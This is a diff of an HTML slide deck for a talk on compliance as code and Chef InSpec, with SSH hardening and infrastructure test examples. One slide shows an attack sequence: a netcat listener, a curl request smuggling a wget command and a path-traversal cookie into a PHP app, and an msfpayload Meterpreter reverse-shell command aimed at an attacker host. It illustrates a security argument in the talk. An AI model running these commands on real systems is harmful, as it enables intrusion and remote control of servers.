@@ -1,264 +1,389 @@
 <!doctype html>
 <html lang="en">
 
-	<head>
-		<meta charset="utf-8">
+  <head>
+    <meta charset="utf-8">
 
-		<title>Security and DevOps for High Velocity Organizations</title>
+    <title>Security and DevOps for High Velocity Organizations</title>
 
-		<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
-		<meta name="author" content="Hakim El Hattab">
+    <meta name="description" content="A framework for easily creating beautiful presentations using HTML">
+    <meta name="author" content="Hakim El Hattab">
 
-		<meta name="apple-mobile-web-app-capable" content="yes">
-		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 
-		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
 
-		<link rel="stylesheet" href="css/reveal.css">
-		<link rel="stylesheet" href="css/theme/beige.css" id="theme">
-		<link rel="stylesheet" href="css/present.css">
+    <link rel="stylesheet" href="css/reveal.css">
+    <link rel="stylesheet" href="css/theme/beige.css" id="theme">
+    <link rel="stylesheet" href="css/present.css">
 
-		<!-- Code syntax highlighting -->
-		<link rel="stylesheet" href="lib/css/zenburn.css">
-		<link rel="stylesheet" href="css/my.css" media="screen" charset="utf-8">
+    <!-- Code syntax highlighting -->
+    <link rel="stylesheet" href="lib/css/zenburn.css">
+    <link rel="stylesheet" href="css/my.css" media="screen" charset="utf-8">
 
-		<link rel="stylesheet" href="bower_components/highlightjs/styles/rainbow.css" id="theme">
-		<script src="bower_components/highlightjs/highlight.pack.min.js" charset="utf-8"></script>
+    <link rel="stylesheet" href="bower_components/highlightjs/styles/rainbow.css" id="theme">
+    <script src="bower_components/highlightjs/highlight.pack.min.js" charset="utf-8"></script>
 
-		<!-- Printing and PDF exports -->
-		<script>
-			var link = document.createElement( 'link' );
-			link.rel = 'stylesheet';
-			link.type = 'text/css';
-			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
-			document.getElementsByTagName( 'head' )[0].appendChild( link );
-		</script>
+    <!-- Printing and PDF exports -->
+    <script>
+      var link = document.createElement( 'link' );
+      link.rel = 'stylesheet';
+      link.type = 'text/css';
+      link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+      document.getElementsByTagName( 'head' )[0].appendChild( link );
+    </script>
 
-		<!--[if lt IE 9]>
-		<script src="lib/js/html5shiv.js"></script>
-		<![endif]-->
-		<style media="screen">
-			.col50 {
-				width: 49%;
-				display: inline-block;
-			}
-		</style>
-	</head>
+    <!--[if lt IE 9]>
+    <script src="lib/js/html5shiv.js"></script>
+    <![endif]-->
+    <style media="screen">
+      .col50 {
+        width: 49%;
+        display: inline-block;
+      }
+    </style>
+  </head>
 
-	<body>
-		<div style="position: fixed; bottom: 1.5rem; right: 1.5rem; color: white; font-size: 1vw; z-index: 10000;" id="timenow">
-		</div>
-		<script type="text/javascript">
-			function toHHMMSS(time) {
-		    var hours   = time.getHours();
-		    var minutes = time.getMinutes();
-		    var seconds = time.getSeconds();
+  <body>
+    <div style="position: fixed; bottom: 1.5rem; right: 1.5rem; color: white; font-size: 1vw; z-index: 10000;" id="timenow">
+    </div>
+    <script type="text/javascript">
+      function toHHMMSS(time) {
+        var hours   = time.getHours();
+        var minutes = time.getMinutes();
+        var seconds = time.getSeconds();
 
-		    if (hours   < 10) {hours   = "0"+hours;}
-		    if (minutes < 10) {minutes = "0"+minutes;}
-		    if (seconds < 10) {seconds = "0"+seconds;}
-		    var time    = hours+':'+minutes+':'+seconds;
-		    return time;
-			}
+        if (hours   < 10) {hours   = "0"+hours;}
+        if (minutes < 10) {minutes = "0"+minutes;}
+        if (seconds < 10) {seconds = "0"+seconds;}
+        var time    = hours+':'+minutes+':'+seconds;
+        return time;
+      }
 
-			setInterval(function(){
-				var time = new Date();
-				document.getElementById("timenow").innerHTML = toHHMMSS(time);1
-			}, 1000)
-		</script>
+      setInterval(function(){
+        var time = new Date();
+        document.getElementById("timenow").innerHTML = toHHMMSS(time);1
+      }, 1000)
+    </script>
 
-		<div class="reveal">
+    <div class="reveal">
 
-			<!-- Any section element inside of this container is displayed as a slide -->
-			<div class="slides">
+      <!-- Any section element inside of this container is displayed as a slide -->
+      <div class="slides">
 
-				<section>
-					<h1>Chef Compliance</h1>
-					<h3>Security and DevOps for High Velocity Organizations</h3>
-				</section>
+        <section data-background="bridge.jpeg">
+          <h1 class="lightbg">Compliance &amp; DevOps</h1>
+          <h3 class="lightbg">Bridging the gap</h3>
+        </section>
 
-				<section>
-					<img src="full.workflow.png" alt="Full Workflow"/>
-				</section>
+        <!--
+        Tell the personal story of how auditors came into our DevOps cloud
+        project 5 years ago.
+        * feeling: like a clash of worlds; going into a different country speaking a different language
+        * process: traditional workflow, traditional processes; didn't go well with our DevOps approach
+        * important:
+        * result: learnings
+        -->
+        <section data-background="power.plant.jpg">
+          <h2 class="lightbg">DevOps meets compliance</h2>
+          <p class="lightbg">anno 2011</p>
+        </section>
 
-				<section>
-					<h3 style="text-transform: lowercase;">$> whoarewe</h3>
-					<div class="col50">
-						<p>Christoph Hartmann</p>
-						<p style="font-size: smaller">Engineering Manager at Chef</p>
-						<ul class="vertical-list" style="font-size: 1.0vw; text-align:center">
-							<li><a href="https://twitter.com/chri_hartmann"><i class="icon-twitter"></i>@chri_hartmann</a></li>
-							<li><a href="https://github.com/chris-rock"><i class="icon-github-circled"></i>chris-rock</a></li>
-							<li><a href="mailto:chartmann@chef.io"><i class="icon-mail-alt"></i>chartmann@chef.io</a></li>
-						</ul>
-					</div>
-					<div class="col50">
-						<p>Dominik Richter</p>
-						<p style="font-size: smaller">Product Manager at Chef</p>
-						<ul class="vertical-list" style="font-size: 1.0vw; text-align:center">
-							<li><a href="https://twitter.com/arlimus"><i class="icon-twitter"></i>@arlimus</a></li>
-							<li><a href="https://github.com/arlimus"><i class="icon-github-circled"></i>arlimus</a></li>
-							<li><a href="mailto:drichter@chef.io"><i class="icon-mail-alt"></i>drichter@chef.io</a></li>
-						</ul>
-					<div>
-				</section>
+      <!--
+        <section>
+          <h2>Overview</h2>
+          <ol style="text-align:left">
+            <li>Compliance 101</li>
+            <li>Bridging the gap</li>
+            <li>Continuous compliance</li>
+          </ol>
+        </section>
+      -->
 
-				<!--
-				Operating at velocity has benefits in addition to agile, scalable compliance.
-				The processes, culture and technology used for compliance at velocity also
-				give an enterprise a level of velocity, scale and consistency that lets it
-				compete in the digital age. We refer to such an enterprise as a “coded business”.
-				-->
-				<section>
-					<h2>The promise of the coded business</h2>
-					<img src="codification.promises.png" alt="Codification promises" style="margin-top: -2rem;"/>
-				</section>
+        <section>
+          <h3 style="text-transform: lowercase;">$> whoami</h3>
+          <div class="col50">
+            <p>Dominik Richter</p>
+            <p style="font-size: smaller">Product Manager at Chef</p>
+            <ul class="vertical-list" style="font-size: smaller; text-align:center">
+              <li>
+                <a href="https://twitter.com/arlimus"><i class="icon-twitter"></i>@arlimus</a> <a href="https://github.com/arlimus"><i class="icon-github-circled"></i>arlimus</a>
+              </li>
+            </ul>
+          <div>
+        </section>
 
-				<!--
-				The coded business collapses the traditionally distinct strategic focus
-				areas of customer intimacy, operational efficiency and product improvement
-				into a single accelerated cycle. We refer to this as the automation cycle,
-				because the automation of the process throughout the product delivery
-				lifecycle is core to its effectiveness.
-				<section>
-					<h2>Transformation to high-velocity</h2>
-					<img src="business.functions.png" alt="Business functions" style="width: 70%;"/>
-				</section>
-				-->
+        <!-- <section>
+          <h1>1. Compliance 101</h1>
+        </section> -->
 
-				<section>
-					<img src="compliance.v.velocity.1.png" alt="Compliance v Velocity 1" width="70%" />
-				</section>
-				<section>
-					<img src="compliance.v.velocity.2.png" alt="Compliance v Velocity 2" width="70%" />
-				</section>
-				<section>
-					<img src="compliance.v.velocity.3.png" alt="Compliance v Velocity 3" width="70%" />
-				</section>
-
-				<section>
-					<img src="compliance.v.velocity.4.png" alt="Compliance v Velocity 4" width="90%" />
-				</section>
-
-				<section>
-					<img src="detect-correct.png" alt="Detect and Correct" style="width: 80%;"/>
-				</section>
-
-				<section>
-					<h2>What is Chef?</h2>
-					<img src="chef.logo.png" alt="What is Chef" style="width: 30%;"/>
-				</section>
-
-				<section>
-					<h2>DevOps automation from<br>conception to production.</h2>
-				</section>
-
-				<section>
-					<h2>What is <img src="chef.logo.png" alt="Chef" style="margin: 0 0 -0.16em 0; height: 1em; display: inline-block;"/>
-						<span class="highlight">Compliance</span>?</h2>
-				</section>
-
-				<section>
-					<h2>Compliance as Code.</h2>
-				</section>
-
-				<!-- <section>
-					<h2>Compliance as Code.</h2>
-					<img src="codification.promises.png" alt="Codification promises" style="margin-top: -2rem;"/>
-				</section> -->
-
-				<section>
-					<h2>What is it not?</h2>
-					<ul class=vertical-list>
-						<li class=fragment>(H)IDS / IPS</li>
-						<li class=fragment>Firewall</li>
-						<li class=fragment>AntiVirus</li>
-						<li class=fragment>Pentesting tool</li>
-					</ul>
-				</section>
-
-				<section>
-					<h2>Compliance as Code.</h2>
-					<img src="same.stack+workflow.png" alt="Same stack and workflow" />
-				</section>
-
-				<!--
-				PART 1: LANGUAGE
-				================
-				-->
-
-				<section data-background="silos.jpg">
-					<h2 style="color: #FFA739; background: rgba(0,0,0,0.6)">Traditional Compliance</h2>
-				</section>
-
-				<section>
-					<h2>Dev &amp; Ops set up an App</h2>
-					<img src="compliance.users.devops.png" alt="DevOps users" style="clip: rect(0px,60px,200px,0px);"/>
-				</section>
-
-				<section>
-					<h2>Security meets operations</h2>
-					<img src="compliance.users.png" alt="Compliance users"/>
-				</section>
-
-				<section data-background="letters.jpg">
+        <section data-background="morris.worm.jpg">
           &nbsp;
-				</section>
+          <p style="font-size: small; color: #888">
+            Source: <a src="https://flic.kr/p/gYnnPg">Intel Free Source on flick</a>
+          </p>
+        </section>
 
-				<section data-background="compliance.doc.png">
+        <section>
+          <p>Security vulnerabilities gave rise to IT compliance</p>
+          <ul class=spacelist style="width: 70%">
+            <li >1988 Morris Worm<span class=fragment>, National Bank Chicago 70$mio theft</span></li>
+            <li class=fragment>1994 Citibank 10$mio hack, AOHell</li>
+            <li class=fragment>1996 Brotherhood hacks Canadian Broadcast Corp.</li>
+            <li class=fragment>1998 Free Mitnick Logic Bomb; Security incidents at 75% of organizations</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>State of security in YYYY</h2>
+          <ul class=spacelist style="width: 70%">
+            <li >In 60% of cases, attackers can compromise organizations within minutes.</li>
+            <li class=fragment>99.9% of the exploited vulnerabilities were compromised more than a year after the vulnerability was published.</li>
+            <li class=fragment>Ten vulnerabilities account for 97% of the exploits observed.</li>
+          </ul>
+          <small>Verizon Data Breach Report</small>
+        </section>
+
+        <section>
+          <h2>State of security in 2014</h2>
+          <ul class=spacelist style="width: 70%">
+            <li>In 60% of cases, attackers can compromise organizations within minutes.</li>
+            <li>99.9% of the exploited vulnerabilities were compromised more than a year after the vulnerability was published.</li>
+            <li>Ten vulnerabilities account for 97% of the exploits observed.</li>
+          </ul>
+          <small>Verizon Data Breach Report</small>
+        </section>
+
+				<section>
+          <h2>Cycle of regulation</h2>
+          <img src="regulation.loop.png" alt="Regulation Loop"/>
+        </section>
+
+        <section>
+          <h2>Compliance and security</h2>
+          <img src="compliance-v-security.png" alt="Compliance v Security" style="width: 50%"/>
+        </section>
+
+        <section>
+          <p>Offer baseline security and isolation layers</p>
+          <pre>
+            <code class="hljs bash wrap">
+# let's try some wget
+nc -l 8888
+
+curl 'http://192.168.1.2/expenses.php?ccc=wget%20http%3A%2F%2F192.168.1.10%3A8888' --cookie 'PHPSESSID=31468g1scu79qbp0lcjp85aj82; path=/; user=../../../../../../../../var/lib/php/session/sess_31468g1scu79qbp0lcjp85aj82%00'
+
+msfpayload linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 X > met
+
+# copy met to /var/www and start apache
+...
+            </code>
+          </pre>
+        </section>
+
+        <section>
+          <h2>Regulatory compliance</h2>
+          <table class="equi3">
+            <tr><td>PCI-DSS</td> <td>Gramm-Leach-Bliley Act</td> <td>HIPAA</td></tr>
+            <tr><td>Dodd-Frank</td> <td>ISO</td> <td>Sarbanes-Oxley</td></tr>
+            <tr><td>HITECH</td> <td>Grundschutz</td> <td>European Central Bank Regulations</td></tr>
+          </table>
+        </section>
+
+        <section data-background="compliance.doc.png">
           &nbsp;
-				</section>
+        </section>
 
-				<section data-background="cli.output.png">
+        <section data-background="writing.jpg">
           &nbsp;
+          <ul class="fragment vertical-list" style="text-align: center; background: rgba(255,255,255,0.66); padding: 1em;">
+            <li >Processes</li>
+            <li class=fragment>Data storage / processing</li>
+            <li class=fragment>Configuration</li>
+            <li class=fragment>Vulnerability handling</li>
+          </ul>
+        </section>
+
+        <!--
+  * how to adress compliance in an organization effectively + rapidly
+  * orgs struggle under the weight of technical debt
+  * demonstrate transformational change
+  * major gains via Compliance
+
+  Why Compliance?
+  * show statistics
+  * it's still a problem / not solved
+
+  Old workflow
+
+  Technical Debt
+  * config of old-school systems
+  * nw + hw + sw automation
+
+  Orgs Transformation
+  * need to demonstrate this transformation
+      -->
+
+      <!--
+      PART 1: LANGUAGE
+      ================
+      -->
+
+      <section data-background="bridging.the.gap.jpg">
+        <!-- <h1>2. Bridging the gap</h1> -->
+        <h2 class="lightbg">bridging the gap</h2>
+        <p>
+          <a style="font-size: small; color: #888;" href="https://www.linkedin.com/pulse/20140717101655-122480423-bridging-the-gap-between-academia-and-industry-in-the-middle-east">Source</a>
+        </p>
+      </section>
+
+      <section>
+        <h2>Creating a new component</h2>
+        <img src="compliance.users.devops.png" alt="DevOps users" style="clip: rect(0px,60px,200px,0px);"/>
+      </section>
+
+      <section data-background="cli.output.png">
+        &nbsp;
+      </section>
+
+        <!--
+        Operating at velocity has benefits in addition to agile, scalable compliance.
+        The processes, culture and technology used for compliance at velocity also
+        give an enterprise a level of velocity, scale and consistency that lets it
+        compete in the digital age. We refer to such an enterprise as a “coded business”.
+        -->
+        <section>
+          <h2>The promise of the coded business</h2>
+          <img src="codification.promises.png" alt="Codification promises" style="margin-top: -2rem;"/>
+        </section>
+
+        <section data-background="silos.jpg">
+          &nbsp;
+        </section>
+
+        <section>
+          <h2>Security meets operations</h2>
+          <img src="compliance.users.png" alt="Compliance users"/>
+        </section>
+
+        <section data-background="compliance.doc.png">
+          &nbsp;
+        </section>
+
+        <section>
+          <img src="different.languages.png" alt="Different language"/>
+        </section>
+
+        <section>
+          <img src="bring.users.together.2.png" alt="Bringing users together"/>
+        </section>
+
+        <section>
+          <h3>Documentation</h3>
+          <quote>
+            SSH supports two different protocol versions. The original version, SSHv1,
+            was subject to a number of security issues. Please use SSHv2 instead to
+            avoid these.
+          </quote>
+        </section>
+
+        <section>
+          <h2>Codify system hardening</h2>
+          <pre>
+            <code class="hljs json">
+{
+    "name": "hardening",
+    "description": "Secure our server",
+    "json_class": "Chef::Role",
+    "chef_type": "role",
+    "run_list": [
+        "recipe[os-hardening]",
+        "recipe[ssh-hardening]"
+        ...
+            </code>
+          </pre>
+        </section>
+
+        <section>
+          <h2>Codify system hardening</h2>
+          <pre>
+            <code class="hljs ruby">
+template '/etc/ssh/sshd_config' do
+  source 'opensshd.conf.erb'
+  mode '0600'
+  owner 'root'
+  group 'root'
+  variables(
+    mac: SshMac.get_macs(node),
+    kex: SshKex.get_kexs(node),
+    cipher: SshCipher.get_ciphers(node),
+    ...
+            </code>
+          </pre>
+        </section>
+
+        <section>
+          <h2>Almost there</h2>
+          <p>Test for assurance across your infrastructure and apps</p>
+        </section>
+
+				<section>
+					<h3>Why infrastructure testing?</h3>
+				</section>
+
+				<section data-background="nuclear.jpeg">
+					<h3 style="background: rgba(255,255,255,0.4);">Code breaks</h3>
+					<p style="background: rgba(0,0,0,0.3); color: white; font-size: smaller;">normal accident theory</p>
+				</section>
+
+				<section data-background="#fff">
+					<img src="dc.complexity.1.png" alt="DC complexity 1" style="box-shadow: none" />
+				</section>
+
+				<section data-background="#fff">
+					<img src="dc.complexity.2.png" alt="DC complexity 2" style="box-shadow: none" />
+				</section>
+
+				<section data-background="#fff">
+					<img src="dc.complexity.3.png" alt="DC complexity 3" style="box-shadow: none" />
 				</section>
 
 				<section>
-					<img src="different.languages.png" alt="Different language"/>
+					<h3>Why infrastructure testing?</h3>
+					<h3 class="fragment">1. Reduce the number of defects</h3>
+					<h3 class="fragment">2. Security and Compliance testing</h3>
 				</section>
 
-				<section>
-					<img src="bring.users.together.png" alt="Unifying language"/>
-				</section>
-
-				<section>
-					<h3>Documentation</h3>
-					<quote>
-						SSH supports two different protocol versions. The original version, SSHv1,
-						was subject to a number of security issues. Please use SSHv2 instead to
-						avoid these.
-					</quote>
-				</section>
-
-				<section>
-					<h3>Scripting tools</h3>
-					<pre>
-						<code class="hljs bash">
+        <section>
+          <h3>Scripting tools</h3>
+          <pre>
+            <code class="hljs bash">
 > grep "^Protocol" /etc/ssh/sshd_config | sed 's/Protocol //'
 2
-						</code>
-					</pre>
-				</section>
+            </code>
+          </pre>
+        </section>
 
-				<section>
-					<h3>Compliance language</h3>
-					<pre>
-						<code class="hljs ruby">
+        <section>
+          <h3>Testing a requirement</h3>
+          <pre>
+            <code class="hljs ruby">
 describe sshd_config do
   its('Protocol') { should cmp 2 }
 end
-						</code>
-					</pre>
-				</section>
+            </code>
+          </pre>
+        </section>
 
-				<section>
+				<section data-background="#FFCC98">
 					<h1>InSpec</h1>
 				</section>
 
-				<section>
-					<h3>Compliance language</h3>
-					<pre>
-						<code class="hljs ruby">
+        <section>
+          <h3>Compliance language</h3>
+          <pre>
+            <code class="hljs ruby">
 control 'ssh-1234' do
   impact 1.0
   title 'Server: Set protocol version to SSHv2'
@@ -271,563 +396,209 @@ control 'ssh-1234' do
     its('Protocol') { should eq('2') }
   end
 end
-						</code>
-					</pre>
-				</section>
+            </code>
+          </pre>
+        </section>
 
 				<section>
-					<h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> One language</h3>
-					<ul class="vertical-list">
-						<li>Linux<span class=fragment>, Windows</span><span class=fragment>, BSD, Solaris, AIX, ...</span></li>
-					</ul>
+					<img src="cis2inspec.png" alt="CIS to InSpec translation" />
 				</section>
 
-				<section>
-					<h3>Windows</h3>
-					<pre>
-						<code class="hljs ruby">
-control 'windows-base-201' do
-  impact 1.0
-  title 'Strong Windows NTLMv2 Authentication Enabled; Weak LM Disabled'
-  desc '
-    @link: http://support.microsoft.com/en-us/kb/823659
-  '
-  describe registry_key('HKLM\System\CurrentControlSet\Control\Lsa') do
-    it { should exist }
-    its('LmCompatibilityLevel') { should eq 4 }
-  end
-end
-						</code>
-					</pre>
-				</section>
+        <section>
+          <h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> Common language</h3>
+          <ul class="vertical-list">
+            <li class=fragment>Compliance requirements as code</li>
+            <li class=fragment>Infrastructure automation as code</li>
+            <li class=fragment>Application automation as code</li>
+          </ul>
+        </section>
+
+        <section>
+          <h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> Silo-breaking</h3>
+          <ul class="vertical-list">
+            <li class=fragment>Build foundation for communication</li>
+            <li class=fragment>Share knowledge and code</li>
+            <li class=fragment>Codify agreements after audits</li>
+          </ul>
+        </section>
+
+        <section>
+          <h3>Profile foundation</h3>
+          <img src="inheritance1.png" alt="Base profile for inheritance" />
+        </section>
+
+        <section>
+          <h3>Make adjustments</h3>
+          <img src="inheritance2.png" alt="Base profile inheritance" />
+        </section>
+
+        <section>
+          <h3>Spread to other environments</h3>
+          <img src="inheritance3.png" alt="More inheritance" />
+        </section>
 
-				<!-- <section data-transition="fade-out">
-					<h3>Tiny HowTo</h3>
-					<pre><code class="hljs bash">
-inspec
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-Commands:
-	inspec archive PATH    # archive a profile to tar.gz (default) or zip
-	inspec check PATH      # verify all tests at the specified PATH
-	inspec detect          # detect the target OS
-	inspec exec PATHS      # run all test files at the specified PATH.
-	inspec help [COMMAND]  # Describe available commands or one specific command
-	inspec json PATH       # read all tests in PATH and generate a JSON summary
-	inspec shell           # open an interactive debugging shell
-	inspec version         # prints the version of this tool
-					</code></pre>
-				</section> -->
-
-				<section>
-					<h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> One language</h3>
-					<ul class="vertical-list">
-						<li>Linux, Windows, BSD, Solaris, AIX, ...</li>
-						<li class=fragment>Bare-metal<span class=fragment>, VMs</span><span class=fragment>, Containers</span></li>
-					</ul>
-				</section>
-
-				<!-- <section data-transition="fade">
-					<h3>Tiny HowTo</h3>
-					<span>
-					<pre><code class="hljs bash">
-inspec exec test.rb
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-.
-
-Finished in 0.00228 seconds (files took 1.95 seconds to load)
-1 example, 0 failures
-
-
-
-
-
-					</code></pre>
-				</section>
-				<section  data-transition="fade">
-					<h3>Tiny HowTo</h3>
-					<span>
-					<pre><code class="hljs bash">
-inspec exec test.rb
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-inspec exec /path/to/profile
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-inspec exec github.com/chef/some-profile.git
-					</code></pre>
-				</section> -->
-
-				<section data-transition="fade">
-					<h3>Test your local node</h3>
-					<pre><code class="hljs bash">
-inspec exec test.rb
-					</code></pre>
-					<p class=small>&nbsp;</p>
-				</section>
-
-				<section data-transition="fade">
-					<h3>Test remote via SSH</h3>
-					<pre><code class="hljs bash">
-inspec exec test.rb -i vagrant.key -t ssh://root@172.17.0.1:11022
-					</code></pre>
-					<p class=small>no Ruby / agent on the node</p>
-				</section>
-
-				<section data-transition="fade">
-					<h3>Test remote via WinRM</h3>
-					<pre><code class="hljs bash">
-inspec exec test.rb -t winrm://Admin@192.168.1.2 --password super
-					</code></pre>
-					<p class=small>no Ruby / agent on the node</p>
-				</section>
-
-				<section data-transition="fade-in">
-					<h3>Test Docker Container</h3>
-					<pre><code class="hljs bash">
-inspec exec test.rb -t docker://3cc8837bb6a8
-					</code></pre>
-					<p class=small>no SSH / agent on the container</p>
-				</section>
-
-				<!-- <section>
-					<h3>Anatomy of a container test</h3>
-					<pre><code class="hljs ruby">
-describe package('wget') do
-  it { should be_installed }
-end
-
-describe file('/fetch-all.sh') do
-  it { should be_file }
-  its('owner') { should eq 'root' }
-  its('mode') { should eq 0640 }
-end
-					</code></pre>
-				</section>
-
-				<section>
-					<h3>Anatomy of a container test</h3>
-					<pre><code class="hljs bash">
-inspec exec dtest.rb -t docker://f02e                                                                                              x1 8h44m master[d140c6a]
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-....
-
-Finished in 0.1537 seconds (files took 1.77 seconds to load)
-4 examples, 0 failures
-					</code></pre>
-				</section> -->
-
-				<section>
-					<h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> One language</h3>
-					<ul class="vertical-list">
-						<li>Linux, Windows, BSD, Solaris, AIX, ...</li>
-						<li>Bare-metal, VMs, Containers</li>
-						<li class=fragment>Nodes<span class=fragment>, DBs, Endpoints</span><span class=fragment>, APIs (Azure, ...)</span></li>
-					</ul>
-				</section>
-
-				<section>
-					<h3>DB testing</h3>
-					<pre><code class="hljs ruby">
-describe mysql_session.query("SELECT user, host FROM mysql.user WHERE host = '%'") do
-  its(:stdout) { should be empty  }
-end
-					</code></pre>
-				</section>
-
-				<section>
-					<h3>Cloud testing</h3>
-					<pre><code class="hljs ruby">
-security_groups.each do |security_group|
-  describe security_group do
-    it { should_not have_inbound_rule().with_source('0.0.0.0/0') }
-  end
-end
-					</code></pre>
-				</section>
-
-
-				<!--
-				<section>
-					<h2><span class="fragment highlight-red">Compliance</span> and <span class="fragment highlight-blue">integrity</span></h2>
-				</section>
-
-				<section>
-					<h1>Moving to 1.0</h1>
-				</section>
-
-				<section>
-					<span style="text-alignt: left;">
-						<h2>Native compliance profiles</h2>
-						<h4 class=fragment>and</h4>
-						<h2 class=fragment>Chef integration</h2>
-					</span>
-				</section> -->
-
-				<section>
-					<h1>CIS and SCAP</h1>
-				</section>
-
-				<section>
-					<h3>Great security benchmarks</h3>
-				</section>
-
-				<section>
-					<h3>Great coverage</h3>
-					<ul class="vertical-list">
-						<li>Red Hat Enterprise Linux, Ubuntu, SUSE, Oracle Linux, ...</li>
-						<li class=fragment>Microsoft Windows 7, 8, Server 2008, 2012</li>
-						<li class=fragment>IBM AIX, HP-UX, VMware ESXi</li>
-						<li class=fragment>Oracle MySQL, Apache Tomcat, MS SQL Server, MS IIS</li>
-					</ul>
-				</section>
-
-				<section>
-					<h4>Written in XML</h4>
-					<pre style="font-size: small; margin: 0 auto;">
-						<code class="hljs xml">
-<definition class="compliance" id="oval:org.cisecurity.benchmarks.o_centos_centos:def:1190" version="1">
-  <metadata>
-    <title>Set SSH Protocol to 2</title>
-    <affected family="unix">
-      <product>CentOS Linux 6</product>
-    </affected>
-    <reference ref_id="xccdf_org.cisecurity.benchmarks_rule_6.2.1_Set_SSH_Protocol_to_2" ref_url="http://benchmarks.cisecurity.org" source="xccdf_org.cisecurity.benchmarks_benchmark_1.1.0.1_CIS_CentOS_Linux_6_Benchmark"/>
-    <description>Set SSH Protocol to 2</description>
-  </metadata>
-  <criteria operator="AND">
-    <criterion negate="false" test_ref="oval:org.cisecurity.benchmarks.o_centos_centos:tst:10191"/>
-  </criteria>
-</definition>
-
-<ind:textfilecontent54_test check="all" check_existence="at_least_one_exists" comment="Ensure 'Protocol' sshd config parameter equals 2 (string)" id="oval:org.cisecurity.benchmarks.o_centos_centos:tst:10191" version="1">
-  <ind:object object_ref="oval:org.cisecurity.benchmarks.o_centos_centos:obj:10193"/>
-  <ind:state state_ref="oval:org.cisecurity.benchmarks.o_centos_centos:ste:10084"/>
-</ind:textfilecontent54_test>
-
-<ind:textfilecontent54_object comment="Ensure 'Protocol' sshd config parameter equals 2 (string)" id="oval:org.cisecurity.benchmarks.o_centos_centos:obj:10193" version="1">
-  <ind:filepath>/etc/ssh/sshd_config</ind:filepath>
-  <ind:pattern operation="pattern match">^\s*Protocol\s+(\S+)\s*(?:#.*)?$</ind:pattern>
-  <ind:instance datatype="int" operation="equals">1</ind:instance>
-</ind:textfilecontent54_object>
-
-<ind:textfilecontent54_state comment="Ensure 'Protocol' sshd config parameter equals 2 (string)" id="oval:org.cisecurity.benchmarks.o_centos_centos:ste:10084" version="1">
-  <ind:subexpression datatype="string" operation="equals" var_ref="oval:org.cisecurity.benchmarks.o_centos_centos:var:1190"/>
-</ind:textfilecontent54_state>
-						</code>
-					</pre>
-					<span class="copyright">Source and Copyright: Center for Internet Security</span>
-				</section>
-
-				<section>
-					<h4>Converted to InSpec</h4>
-					<pre style="margin: 0 auto;">
-						<code class="hljs ruby">
-control "xccdf_org.cisecurity.benchmarks_rule_6.2.1_Set_SSH_Protocol_to_2" do
-  title "Set SSH Protocol to 2"
-  desc  "SSH supports two different and incompatible protocols: SSH1 and SSH2. SSH1 was the original protocol and was subject to security issues. SSH2 is more advanced and secure."
-  impact 1.0
-  describe file("/etc/ssh/sshd_config") do
-    its(:content) { should match /^\s*Protocol\s+(\S+)\s*(?:#.*)?$/ }
-  end
-  file("/etc/ssh/sshd_config").content.to_s.scan(/^\s*Protocol\s+(\S+)\s*(?:#.*)?$/).flatten.each do |entry|
-    describe entry do
-      it { should eq "2" }
-    end
-  end
-end
-
-</code>
-				</section>
-
-				<section>
-					<h4>Native InSpec</h4>
-					<pre style="margin: 0 auto;">
-						<code class="hljs ruby">
-control "xccdf_org.cisecurity.benchmarks_rule_6.2.1_Set_SSH_Protocol_to_2" do
-  title "Set SSH Protocol to 2"
-  desc  "SSH supports two different and incompatible protocols: SSH1 and SSH2. SSH1 was the original protocol and was subject to security issues. SSH2 is more advanced and secure."
-  impact 1.0
-  describe sshd_config do
-    its('Protocol') { should cmp 2 }
-  end
-end
-						</code>
-					</pre>
-				</section>
-
-				<section data-background="tunnel.jpg">
-          &nbsp;
-				</section>
-
-				<section>
-					<h3>Profile foundation</h3>
-					<img src="inheritance1.png" alt="Base profile for inheritance" />
-				</section>
-
-				<section>
-					<h3>Make adjustments</h3>
-					<img src="inheritance2.png" alt="Base profile inheritance" />
-				</section>
-
-				<section>
-					<h4>Native InSpec</h4>
-					<pre style="margin: 0 auto;">
-						<code class="hljs ruby">
-include_control "cis/cis-centos6-lvl1" do
-  skip_control "xccdf_org.cisecurity.benchmarks_rule_1.5.1_Set_UserGroup_Owner_on_etcgrub.conf"
-  skip_control "xccdf_org.cisecurity.benchmarks_rule_1.5.2_Set_Permissions_on_etcgrub.conf"
-
-  control "xccdf_org.cisecurity.benchmarks_rule_3.9_Remove_DNS_Server" do
-    impact 1.0
-  end
-end
-
-control "my-own-1" ...
-						</code>
-					</pre>
-				</section>
-
-				<section>
-					<h3>Spread to other environments</h3>
-					<img src="inheritance3.png" alt="More inheritance" />
-				</section>
-
-				<!-- <section>
-					<h3>Automated conversion</h3>
-					<pre>
-						<code class="hljs bash">
-# Verify support for current SCAP syntax
-inspec scap coverage profile.tgz
-
-# Convert to native InSpec
-inspec scap convert profile.tgz > inspec-tests.rb
-
-# Test a compliance profile
-inspec exec profile.tgz
-						</code>
-					</pre>
-				</section>
-
-				<section>
-					<h3>Shipped</h3>
-					<ul class="vertical-list">
-						<li>CentOS 6 and 7</li>
-						<li class=fragment>Ubuntu 12.04 and 14.04</li>
-					</ul>
-				</section>
-
-				<section>
